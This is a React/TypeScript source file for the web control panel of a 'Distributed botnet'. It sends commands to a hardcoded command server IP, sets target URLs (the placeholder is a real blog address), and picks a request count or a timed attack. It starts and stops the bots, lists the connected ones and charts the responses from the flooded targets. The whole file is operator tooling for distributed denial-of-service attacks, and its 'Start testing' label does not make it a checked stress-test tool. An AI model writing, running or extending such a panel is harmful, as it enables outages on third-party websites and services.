import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import axios from "axios";
import {
  BarChart,
  Bar,
  XAxis,
  YAxis,
  CartesianGrid,
  Tooltip,
  ResponsiveContainer,
} from "recharts";
import {
  FormControl,
  FormLabel,
  Switch,
  Badge,
  Button,
  Input,
  Code,
  Textarea,
  cx,
  Radio,
} from "@vechaiui/react";

const Panel = () => {
  const navigate = useNavigate();

  const serverUrl = "http://54.211.202.150:5000";

  const [time, setTime] = useState(0);
  const [type, setType] = useState(1);
  const [requestsNum, setRequestsNum] = useState(100);
  const [active, setActive] = useState(false);
  const [running, setRunning] = useState(false);
  const [target, setTarget] = useState("");
  const [activeBots, setActiveBots] = useState([]);
  const [botsStats, setBotsStats] = useState([]);
  const [responses, setResponses] = useState<number[]>([]);
  const [graphData, setGraphData] = useState<Object[]>([]);
  const [visible, setVisible] = useState(false);

  let intervalTimer: NodeJS.Timer;
  let intervalActivity: NodeJS.Timer;

  const logout = () => {
    localStorage.removeItem("password");
    navigate("/login");
  };

  const changeServerStatus = async (serverUrl: string, status: boolean) => {
    const changeServerStatusEndpoint: string = "/setServerStatus";

    const statusObject = {
      status: status,
    };

    try {
      await axios.post(serverUrl + changeServerStatusEndpoint, statusObject);
      setActive(status);
    } catch (err) {
      console.log({
        message: "Status setting failed.",
        errorInfo: err,
      });
    }
  };

  const setRequestsNumber = async (requestsNum: number) => {
    const setRequestsNumberEndpoint: string = "/setRequestsNumber";

    const requestsNumObject = {
      requestsNumber: requestsNum,
    };

    try {
      await axios.post(
        serverUrl + setRequestsNumberEndpoint,
        requestsNumObject
      );
    } catch (err) {
      console.log({
        message: "Requests number setting failed.",
        errorInfo: err,
      });
    }
  };

  const changeTarget = async (serverUrl: string, target: string) => {
    const changeTargetEndpoint: string = "/changeTarget";

    const targetObject = {
      target: target,
    };

    try {
      await axios.post(serverUrl + changeTargetEndpoint, targetObject);
    } catch (err) {
      console.log({
        message: "Target setting failed.",
        errorInfo: err,
      });
    }
  };

  const getActiveBots = async (serverUrl: string) => {
    const getActiveBotsEndpoint = "/getConnectedBots";
    try {
      const response = await axios.get(serverUrl + getActiveBotsEndpoint);
      const responseData = response.data;
      const { connectedBots } = responseData;

      setActiveBots(connectedBots);
      console.log(responseData);
    } catch (err) {
      console.log(err);
    }
  };

  const getBotsStats = async (serverUrl: string, responses: number[]) => {
    const getBotsStatsEndpoint = "/getBotsStats";
    try {
      const response = await axios.get(serverUrl + getBotsStatsEndpoint);
      const responseData = response.data;

      setBotsStats(responseData.stats);
      console.log(responseData.stats);
      const statusCodes: number[] = [];
      responseData.stats.forEach((resp: any) => {
        if (
          new Date().getTime() - new Date(resp.ResponseTime).getTime() <
          100000
        ) {
          statusCodes.push(...resp.Status);
        }
      });
      setResponses(statusCodes);
      setGraphData(parseStatsData(statusCodes));
    } catch (err) {
      console.log(err);
    }
  };

  const parseStatsData = (responseList: number[]) => {
    const data: {
      statusCode: string;
      amount: number;
    }[] = [];

    const countCodes = responseList.reduce(
      (acc: any, curr: any) => ((acc[curr] = (acc[curr] || 0) + 1), acc),
      {}
    );
    for (const status of Object.keys(countCodes)) {
      data.push({
        statusCode: status,
        amount: countCodes[status],
      });
    }

    return data;
  };

  const startBotnet = (
    serverUrl: string,
    requestsNum: number,
    target: string
  ) => {
    setRunning(true);
    setTime(0);
    setRequestsNumber(requestsNum);
    setResponses([]);
    changeServerStatus(serverUrl, true);
    changeTarget(serverUrl, "https://" + target);
    getActiveBots(serverUrl);
  };

  const stopBotnet = (serverUrl: string) => {
    changeServerStatus(serverUrl, false);
    setRunning(false);
    setActiveBots([]);
    setBotsStats([]);
  };

  useEffect(() => {
    if (running) {
      intervalTimer = setInterval(() => {
        setTime((prevTime) => prevTime + 10);
      }, 10);

      intervalActivity = setInterval(() => {
        getActiveBots(serverUrl);
        getBotsStats(serverUrl, responses);
      }, 10000);

      if (type == 2 && time > requestsNum) {
        stopBotnet(serverUrl);
      }
    } else if (!running) {
      clearInterval(intervalTimer);
      clearInterval(intervalActivity);
    }

    return () => {
      clearInterval(intervalTimer);
      clearInterval(intervalActivity);
    };
  }, [running]);

  useEffect(() => {
    if (!localStorage.getItem("password")) {
      navigate("/login");
    } else {
      setVisible(true);
    }
  }, []);

  if (!visible) return null;

  return (
    <div>
      <div className="mt-8 mx-20 mb-10 ">
        <div className="flex justify-between">
          <div className="w-full flex flex-col">
            <h1 className="text-3xl font-bold text-gray-700">
              Distributed botnet
            </h1>
            <p className="text-gray-400 mb-8">version 2.0.0</p>
          </div>
          <Button className="mt-2" onClick={logout}>
            Exit
          </Button>
        </div>
        <div style={{ height: "75vh" }} className="w-full flex">
          <div className="flex flex-col w-1/2">
            <div style={{ height: "40%" }} className="mb-5">
              <p className="text-gray-500 text-base mb-3">
                Give the targets (separate with comma):
              </p>
              <div className="w-5/6">
                <Textarea
                  onChange={(e) => {
                    setTarget(e.target.value);
                  }}
                  placeholder="http://indrekis2.blogspot.com/"
                />
              </div>
              <div className="flex items-center gap-5 w-5/6 mt-3 ">
                <p className="text-sm font-bold text-gray-800  mr-2">
                  Choose mode:
                </p>
                <Radio
                  name="basic"
                  defaultChecked
                  onChange={() => {
                    setType(1);
                  }}
                >
                  Requests amount
                </Radio>
                <Radio
                  name="basic"
                  onChange={() => {
                    setType(2);
                  }}
                >
                  Timed attack
                </Radio>
              </div>
              <div className="flex gap-5 mt-3 mb-3 items-center ">
                <FormControl id="email" className=" flex flex-col ">
                  <FormLabel>
                    {type == 1 ? "Requests amount" : "Amount of time (min)"}
                  </FormLabel>
                  <Input
                    placeholder="100"
                    onChange={(e) => {
                      setRequestsNum(parseInt(e.target.value));
                    }}
                    required
                  />
                </FormControl>
                <FormControl className="flex flex-col ">
                  <FormLabel htmlFor="server-active" className="mb-0 mr-2">
                    Set server active
                  </FormLabel>
                  <Switch
                    className="mt-3"
                    id="server-active"
                    checked={active}
                    onChange={() => changeServerStatus(serverUrl, !active)}
                  />
                </FormControl>
                <Button
                  onClick={() => {
                    changeTarget(serverUrl, target);
                  }}
                >
                  Change target
                </Button>
                <Button
                  onClick={() => {
                    startBotnet(serverUrl, requestsNum, target);
                  }}
                  variant="solid"
                  color="primary"
                  disabled={running}
                >
                  Start testing
                </Button>
              </div>
            </div>
            <div className="bg-gray-100 rounded overflow-scroll p-3 flex flex-col h-1/2">
              <p className="text-gray-500 text-base mb-3">Bots response log:</p>

              {botsStats.length != 0
                ? botsStats.reverse().map((response: any) => {
                    if (
                      new Date().getTime() -
                        new Date(response.ResponseTime).getTime() <
                      100000
                    ) {
                      return (
                        <Code className="flex flex-col justify-start items-start">
                          <p>TIME: {response.ResponseTime}</p>
                          <p>TARGET: {response.Target}</p>
                          <p>STATUS: {JSON.stringify(response.Status)}</p>
                        </Code>
                      );
                    }
                  })
                : "No information retrieved yet"}
            </div>
          </div>
          <div className="flex-col w-1/2">
            <div className="h-1/3">
              <div className="flex items-center mb-3 gap-2">
                <p className="text-gray-500 text-base">Connected bots</p>
                <Badge>{activeBots.length}</Badge>
              </div>
              <div>
                {activeBots.length != 0 ? (
                  activeBots.map((bot: string) => (
                    <div className="bg-gray-100 h-8 flex items-center p-3 mb-1 rounded">
                      <p className="text-gray-700 blur-[5px] hover:blur-none font-medium text-base ">
                        {bot}
                      </p>
                    </div>
                  ))
                ) : (
                  <p className="text-gray-400  font-normal mt-5 text-center">
                    No bots connected
                  </p>
                )}
              </div>
            </div>
            <div className="bg-gray-100 rounded ml-2 h-3/5 p-3">
              <p className="text-gray-500 text-base mb-3">Requests stats</p>
              {graphData.length == 0 ? (
                <p className="mt-5">No information retrieved yet</p>
              ) : (
                <ResponsiveContainer>
                  <BarChart
                    data={graphData}
                    margin={{
                      top: 5,
                      right: 30,
                      left: 20,
                      bottom: 25,
                    }}
                    barSize={30}
                  >
                    <XAxis
                      dataKey="statusCode"
                      scale="point"
                      padding={{ left: 10, right: 10 }}
                    />
                    <YAxis />
                    <Tooltip />
                    {/* <Legend /> */}
                    <CartesianGrid strokeDasharray="3 3" />
                    <Bar
                      dataKey="amount"
                      fill="#14B8A6"
                      background={{ fill: "#eee" }}
                    />
                  </BarChart>
                </ResponsiveContainer>
              )}
            </div>
          </div>
        </div>
      </div>
      <div className="h-20 w-full fixed bottom-0 flex items-center justify-around bg-gray-100">
        <div className=" flex flex-row gap-1">
          <p className="text-gray-400 text-sm ">Target:</p>
          <p className="text-gray-600 text-sm font-medium">
            {target ? target : "Not defined"}
          </p>
        </div>
        <div className=" flex flex-row gap-1">
          <p className="text-gray-400 text-sm ">Status:</p>
          {active ? (
            <p className="text-green-400 text-sm font-medium">Active</p>
          ) : (
            <p className="text-red-400 text-sm font-medium">Disabled</p>
          )}
        </div>
        <div className=" flex flex-row gap-1">
          <p className="text-gray-400 text-sm ">Requests sent:</p>
          <p className="text-gray-700 text-sm font-medium">
            {responses.length}
          </p>
        </div>
        <div className=" flex flex-row gap-1">
          <p className="text-gray-400 text-sm flex items-center">
            Time elapsed:
          </p>
          <p className="text-4xl font-bold text-gray-600 bottom-0">
            <div className="numbers">
              <span>{("0" + Math.floor((time / 60000) % 60)).slice(-2)}:</span>
              <span>{("0" + Math.floor((time / 1000) % 60)).slice(-2)}</span>
            </div>
          </p>
        </div>

        <Button
          onClick={() => {
            stopBotnet(serverUrl);
          }}
          variant="solid"
          className="w-20"
        >
          Stop
        </Button>
      </div>
    </div>
  );
};

export default Panel;
